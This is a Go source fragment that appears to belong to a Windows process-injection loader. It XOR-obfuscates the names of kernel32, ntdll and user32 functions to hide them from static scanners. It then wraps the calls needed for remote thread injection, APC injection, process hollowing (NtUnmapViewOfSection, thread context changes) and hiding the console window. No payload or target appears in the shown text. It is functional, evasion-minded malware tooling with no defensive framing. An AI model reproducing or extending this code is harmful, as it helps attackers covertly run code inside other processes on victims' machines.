// Windows API function wrappers
var (
	obfuscatedKernel32DLL = []byte{0x29, 0x27, 0x30, 0x2c, 0x27, 0x2e, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "kernel32.dll"
	obfuscatedNtdllDLL = []byte{0x2c, 0x36, 0x26, 0x2e, 0x2e, 0x6c, 0x26, 0x2e, 0x2e} // "ntdll.dll"
	obfuscatedUser32DLL = []byte{0x37, 0x31, 0x27, 0x30, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "user32.dll"
	obfuscatedOpenProcess = []byte{0x0d, 0x32, 0x27, 0x2c, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "OpenProcess"
	obfuscatedVirtualAllocEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x03, 0x2e, 0x2e, 0x2d, 0x21, 0x07, 0x3a} // "VirtualAllocEx"
	obfuscatedWriteProcessMemory = []byte{0x15, 0x30, 0x2b, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "WriteProcessMemory"
	obfuscatedCreateRemoteThread = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x10, 0x27, 0x2f, 0x2d, 0x36, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "CreateRemoteThread"
	obfuscatedVirtualProtectEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x12, 0x30, 0x2d, 0x36, 0x27, 0x21, 0x36, 0x07, 0x3a} // "VirtualProtectEx"
	obfuscatedCreateToolhelp32Snapshot = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x16, 0x2d, 0x2d, 0x2e, 0x2a, 0x27, 0x2e, 0x32, 0x71, 0x70, 0x11, 0x2c, 0x21, 0x32, 0x31, 0x2a, 0x2d, 0x30} // "CreateToolhelp32Snapshot"
	obfuscatedProcess32First = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x04, 0x2b, 0x30, 0x31, 0x36, 0x15} // "Process32FirstW"
	obfuscatedProcess32Next = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x0c, 0x27, 0x3a, 0x36, 0x15} // "Process32NextW"
	obfuscatedCreateProcess = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x15} // "CreateProcessW"
	obfuscatedResumeThread = []byte{0x10, 0x27, 0x31, 0x37, 0x2f, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "ResumeThread"
	obfuscatedSuspendThread = []byte{0x11, 0x37, 0x31, 0x32, 0x27, 0x2c, 0x26, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "SuspendThread"
	obfuscatedGetThreadContext = []byte{0x05, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "GetThreadContext"
	obfuscatedSetThreadContext = []byte{0x11, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "SetThreadContext"
	obfuscatedReadProcessMemory = []byte{0x10, 0x27, 0x23, 0x26, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "ReadProcessMemory"
	obfuscatedNtUnmapViewOfSection = []byte{0x0c, 0x36, 0x17, 0x2c, 0x2f, 0x23, 0x32, 0x14, 0x2b, 0x27, 0x35, 0x0d, 0x24, 0x11, 0x27, 0x21, 0x36, 0x2b, 0x2d, 0x2c} // "NtUnmapViewOfSection"
	obfuscatedGetConsoleWindow = []byte{0x05, 0x27, 0x36, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "GetConsoleWindow"
	obfuscatedShowWindow = []byte{0x11, 0x2a, 0x2d, 0x35, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "ShowWindow"
	obfuscatedFreeConsole = []byte{0x04, 0x30, 0x27, 0x27, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27} // "FreeConsole"
	obfuscatedGetExitCodeProcess = []byte{0x05, 0x27, 0x36, 0x07, 0x3a, 0x2b, 0x36, 0x01, 0x2d, 0x26, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "GetExitCodeProcess"
	obfuscatedCreatePipe = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x2b, 0x32, 0x27} // "CreatePipe"
	obfuscatedReadFile = []byte{0x10, 0x27, 0x23, 0x26, 0x04, 0x2b, 0x2e, 0x27} // "ReadFile"
	obfuscatedCreateThread = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "CreateThread"
	obfuscatedQueueUserAPC = []byte{0x13, 0x37, 0x27, 0x37, 0x31, 0x27, 0x30, 0x03, 0x12, 0x01} // "QueueUserAPC"
	obfuscatedWaitForSingleObject = []byte{0x15, 0x23, 0x2b, 0x36, 0x04, 0x2d, 0x30, 0x11, 0x2b, 0x2c, 0x25, 0x2e, 0x27, 0x0d, 0x24, 0x2c, 0x27, 0x21, 0x36} // "WaitForSingleObject"
	obfuscatedCloseHandle = []byte{0x01, 0x2e, 0x2d, 0x31, 0x27, 0x15, 0x23, 0x2c, 0x26, 0x2e, 0x27} // "CloseHandle"
	obfuscatedThread32First = []byte{0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x71, 0x70, 0x04, 0x2b, 0x30, 0x31, 0x36} // "Thread32First"
	obfuscatedThread32Next = []byte{0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x71, 0x70, 0x0c, 0x27, 0x3a, 0x36} // "Thread32Next"

	// NtDll functions for advanced injection
	obfuscatedNtCreateThreadEx = []byte{0x0c, 0x36, 0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x07, 0x3a} // "NtCreateThreadEx"
	obfuscatedNtQueueApcThread = []byte{0x0c, 0x36, 0x13, 0x37, 0x27, 0x37, 0x27, 0x03, 0x12, 0x01, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "NtQueueApcThread"
	obfuscatedRtlCreateUserThread = []byte{0x10, 0x36, 0x2e, 0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x17, 0x31, 0x27, 0x30, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "RtlCreateUserThread"

	obfuscationKey = byte(0x42)

	kernel32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedKernel32DLL, obfuscationKey))
	ntdll = syscall.NewLazyDLL(deobfuscateString(obfuscatedNtdllDLL, obfuscationKey))
	user32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedUser32DLL, obfuscationKey))
	procOpenProcess = kernel32.NewProc(deobfuscateString(obfuscatedOpenProcess, obfuscationKey))
	procVirtualAllocEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualAllocEx, obfuscationKey))
	procWriteProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedWriteProcessMemory, obfuscationKey))
	procCreateRemoteThread = kernel32.NewProc(deobfuscateString(obfuscatedCreateRemoteThread, obfuscationKey))
	procVirtualProtectEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualProtectEx, obfuscationKey))
	procCreateToolhelp32Snapshot = kernel32.NewProc(deobfuscateString(obfuscatedCreateToolhelp32Snapshot, obfuscationKey))
	procProcess32First = kernel32.NewProc(deobfuscateString(obfuscatedProcess32First, obfuscationKey))
	procProcess32Next = kernel32.NewProc(deobfuscateString(obfuscatedProcess32Next, obfuscationKey))
	procCreateProcess = kernel32.NewProc(deobfuscateString(obfuscatedCreateProcess, obfuscationKey))
	procResumeThread = kernel32.NewProc(deobfuscateString(obfuscatedResumeThread, obfuscationKey))
	procSuspendThread = kernel32.NewProc(deobfuscateString(obfuscatedSuspendThread, obfuscationKey))
	procGetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedGetThreadContext, obfuscationKey))
	procSetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedSetThreadContext, obfuscationKey))
	procReadProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedReadProcessMemory, obfuscationKey))
	procNtUnmapViewOfSection = ntdll.NewProc(deobfuscateString(obfuscatedNtUnmapViewOfSection, obfuscationKey))
	procFreeConsole = kernel32.NewProc(deobfuscateString(obfuscatedFreeConsole, obfuscationKey))
	procShowWindow = user32.NewProc(deobfuscateString(obfuscatedShowWindow, obfuscationKey))
	procGetConsoleWindow = kernel32.NewProc(deobfuscateString(obfuscatedGetConsoleWindow, obfuscationKey))
	procGetExitCodeProcess = kernel32.NewProc(deobfuscateString(obfuscatedGetExitCodeProcess, obfuscationKey))
	procCreatePipe = kernel32.NewProc(deobfuscateString(obfuscatedCreatePipe, obfuscationKey))
	procReadFile = kernel32.NewProc(deobfuscateString(obfuscatedReadFile, obfuscationKey))
	procCreateThread = kernel32.NewProc(deobfuscateString(obfuscatedCreateThread, obfuscationKey))
	procQueueUserAPC = kernel32.NewProc(deobfuscateString(obfuscatedQueueUserAPC, obfuscationKey))
	procWaitForSingleObject = kernel32.NewProc(deobfuscateString(obfuscatedWaitForSingleObject, obfuscationKey))
	procCloseHandle = kernel32.NewProc(deobfuscateString(obfuscatedCloseHandle, obfuscationKey))
	procThread32First = kernel32.NewProc(deobfuscateString(obfuscatedThread32First, obfuscationKey))
	procThread32Next = kernel32.NewProc(deobfuscateString(obfuscatedThread32Next, obfuscationKey))
	procNtCreateThreadEx = ntdll.NewProc(deobfuscateString(obfuscatedNtCreateThreadEx, obfuscationKey))
	procNtQueueApcThread = ntdll.NewProc(deobfuscateString(obfuscatedNtQueueApcThread, obfuscationKey))
	procRtlCreateUserThread = ntdll.NewProc(deobfuscateString(obfuscatedRtlCreateUserThread, obfuscationKey))
)

// Obfuscation func for runtime deobfuscation
func deobfuscateString(obfuscated []byte, key byte) string {
	result := make([]byte, len(obfuscated))
	for i := 0; i < len(obfuscated); i++ {
		result[i] = obfuscated[i] ^ key
	}
	return string(result)
}

// Windows API function wrappers
func createToolhelp32Snapshot(flags uint32, processID uint32) uintptr {
	ret, _, _ := procCreateToolhelp32Snapshot.Call(
		uintptr(flags),
		uintptr(processID),
	)
	return ret
}

func process32First(snapshot uintptr, pe *PROCESSENTRY32) bool {
	ret, _, _ := procProcess32First.Call(
		snapshot,
		uintptr(unsafe.Pointer(pe)),
	)
	return ret != 0
}

func process32Next(snapshot uintptr, pe *PROCESSENTRY32) bool {
	ret, _, _ := procProcess32Next.Call(
		snapshot,
		uintptr(unsafe.Pointer(pe)),
	)
	return ret != 0
}

func createProcess(applicationName *uint16, commandLine *uint16, processAttributes, threadAttributes *syscall.SecurityAttributes, inheritHandles bool, creationFlags uint32, environment uintptr, currentDirectory *uint16, startupInfo *STARTUPINFO, processInformation *PROCESS_INFORMATION) error {
	var inheritHandlesInt int32 = 0
	if inheritHandles {
		inheritHandlesInt = 1
	}
	ret, _, callErr := procCreateProcess.Call(
		uintptr(unsafe.Pointer(applicationName)),
		uintptr(unsafe.Pointer(commandLine)),
		uintptr(unsafe.Pointer(processAttributes)),
		uintptr(unsafe.Pointer(threadAttributes)),
		uintptr(inheritHandlesInt),
		uintptr(creationFlags),
		environment,
		uintptr(unsafe.Pointer(currentDirectory)),
		uintptr(unsafe.Pointer(startupInfo)),
		uintptr(unsafe.Pointer(processInformation)),
	)
	if ret == 0 {
		return callErr
	}
	return nil
}

func resumeThread(threadHandle uintptr) (uint32, error) {
	ret, _, callErr := procResumeThread.Call(threadHandle)
	if ret == 0xFFFFFFFF {
		return 0, callErr
	}
	return uint32(ret), nil
}

func suspendThread(threadHandle uintptr) (uint32, error) {
	ret, _, callErr := procSuspendThread.Call(threadHandle)
	if ret == 0xFFFFFFFF {
		return 0, callErr
	}
	return uint32(ret), nil
}

func getThreadContext(threadHandle uintptr, context *CONTEXT) error {
	ret, _, callErr := procGetThreadContext.Call(
		threadHandle,
		uintptr(unsafe.Pointer(context)),
	)
	if ret == 0 {
		return callErr
	}
	return nil
}

func setThreadContext(threadHandle uintptr, context *CONTEXT) error {
	ret, _, callErr := procSetThreadContext.Call(
		threadHandle,
		uintptr(unsafe.Pointer(context)),
	)
	if ret == 0 {
		return callErr
	}
	return nil
}

func readProcessMemory(process uintptr, baseAddress uintptr, buffer uintptr, size uintptr, numberOfBytesRead *uintptr) bool {
	ret, _, _ := procReadProcessMemory.Call(
		process,
		baseAddress,
		buffer,
		size,
		uintptr(unsafe.Pointer(numberOfBytesRead)),
	)
	return ret != 0
}

func ntUnmapViewOfSection(processHandle uintptr, baseAddress uintptr) uint32 {
	ret, _, _ := procNtUnmapViewOfSection.Call(
		processHandle,
		baseAddress,
	)
	return uint32(ret)
}

func createThread(threadAttributes uintptr, stackSize uintptr, startAddress uintptr, parameter uintptr, creationFlags uint32, threadId *uint32) uintptr {
	ret, _, _ := procCreateThread.Call(
		threadAttributes,
		stackSize,
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(threadId)),
	)
	return ret
}

func queueUserAPC(aptProc uintptr, threadHandle uintptr, dwData uintptr) uint32 {
	ret, _, _ := procQueueUserAPC.Call(
		aptProc,
		threadHandle,
		dwData,
	)
	return uint32(ret)
}

func waitForSingleObject(handle uintptr, milliseconds uint32) uint32 {
	ret, _, _ := procWaitForSingleObject.Call(
		handle,
		uintptr(milliseconds),
	)
	return uint32(ret)
}

func closeHandle(handle uintptr) bool {
	ret, _, _ := procCloseHandle.Call(handle)
	return ret != 0
}

func thread32First(snapshot uintptr, te *THREADENTRY32) bool {
	ret, _, _ := procThread32First.Call(
		snapshot,
		uintptr(unsafe.Pointer(te)),
	)
	return ret != 0
}

func thread32Next(snapshot uintptr, te *THREADENTRY32) bool {
	ret, _, _ := procThread32Next.Call(
		snapshot,
		uintptr(unsafe.Pointer(te)),
	)
	return ret != 0
}

func ntCreateThreadEx(threadHandle *uintptr, desiredAccess uint32, objectAttributes uintptr, processHandle uintptr, startAddress uintptr, parameter uintptr, creationFlags uint32, stackZeroBits uintptr, sizeOfStackCommit uintptr, sizeOfStackReserve uintptr, bytesBuffer uintptr) uint32 {
	ret, _, _ := procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(threadHandle)),
		uintptr(desiredAccess),
		objectAttributes,
		processHandle,
		startAddress,
		parameter,
		uintptr(creationFlags),
		stackZeroBits,
		sizeOfStackCommit,
		sizeOfStackReserve,
		bytesBuffer,
	)
	return uint32(ret)
}

func ntQueueApcThread(threadHandle uintptr, apcRoutine uintptr, apcArgument1 uintptr, apcArgument2 uintptr, apcArgument3 uintptr) uint32 {
	ret, _, _ := procNtQueueApcThread.Call(
		threadHandle,
		apcRoutine,
		apcArgument1,
		apcArgument2,
		apcArgument3,
	)
	return uint32(ret)
}

func rtlCreateUserThread(processHandle uintptr, securityDescriptor uintptr, createSuspended bool, stackZeroBits uintptr, stackReserve uintptr, stackCommit uintptr, startAddress uintptr, parameter uintptr, threadHandle *uintptr, clientId *CLIENT_ID) uint32 {
	var suspendedInt int32 = 0
	if createSuspended {
		suspendedInt = 1
	}
	ret, _, _ := procRtlCreateUserThread.Call(
		processHandle,
		securityDescriptor,
		uintptr(suspendedInt),
		stackZeroBits,
		stackReserve,
		stackCommit,
		startAddress,
		parameter,
		uintptr(unsafe.Pointer(threadHandle)),
		uintptr(unsafe.Pointer(clientId)),
	)
	return uint32(ret)
}

func openProcess(desiredAccess uint32, inheritHandle int32, processId uint32) uintptr {
	ret, _, _ := procOpenProcess.Call(
		uintptr(desiredAccess),
		uintptr(inheritHandle),
		uintptr(processId),
	)
	return ret
}

func virtualAllocEx(process uintptr, address uintptr, size uintptr, allocationType uint32, protect uint32) uintptr {
	ret, _, _ := procVirtualAllocEx.Call(
		process,
		address,
		size,
		uintptr(allocationType),
		uintptr(protect),
	)
	return ret
}

func writeProcessMemory(process uintptr, baseAddress uintptr, buffer uintptr, size uintptr, numberOfBytesWritten *uintptr) bool {
	ret, _, _ := procWriteProcessMemory.Call(
		process,
		baseAddress,
		buffer,
		size,
		uintptr(unsafe.Pointer(numberOfBytesWritten)),
	)
	return ret != 0
}

func createRemoteThread(process uintptr, threadAttributes uintptr, stackSize uintptr, startAddress uintptr, parameter uintptr, creationFlags uint32, threadId *uint32) uintptr {
	ret, _, _ := procCreateRemoteThread.Call(
		process,
		threadAttributes,
		stackSize,
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(threadId)),
	)
	return ret
}

func virtualProtectEx(process uintptr, address uintptr, size uintptr, newProtect uint32, oldProtect *uint32) bool {
	ret, _, _ := procVirtualProtectEx.Call(
		process,
		address,
		size,
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)
	return ret != 0
}